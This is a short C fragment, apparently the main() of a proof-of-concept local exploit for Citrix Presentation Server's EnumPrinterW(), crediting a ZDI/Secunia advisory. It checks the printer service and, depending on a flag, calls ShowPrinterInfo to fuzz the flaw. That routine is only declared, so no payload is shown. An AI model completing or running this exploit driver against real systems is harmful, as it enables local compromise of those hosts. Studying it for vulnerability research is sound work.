
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int ShowPrinterInfo (int *,int,int,char*) ;
 int printf (char*) ;
 int testPrinters () ;
 int usage (char*) ;

int main ( int argc, char *argv[] )
{

   printf("[+] Citrix Presentation Server - Local EnumPrinterW() POC exploit\n");
   printf("[+] Discovered by ZDI - http://secunia.com/advisories/23869/\n");
   printf("[+] Proof of concept by Andres Tarasco - atarasco@514.es\n\n");

   if (argc!=2) usage(argv[0]);

   testPrinters();
   printf("[+] Printer Service Seems to be working.. Fuzzing\n");

   if ( (argv[1][1]=='u')) {
      ShowPrinterInfo(((void*)0),1,3,"[*]");
      testPrinters();
   }
   if ( (argv[1][1]=='a')) {
      ShowPrinterInfo(((void*)0),1,1,"[*]");
      testPrinters();
   }


   return(0);
 }
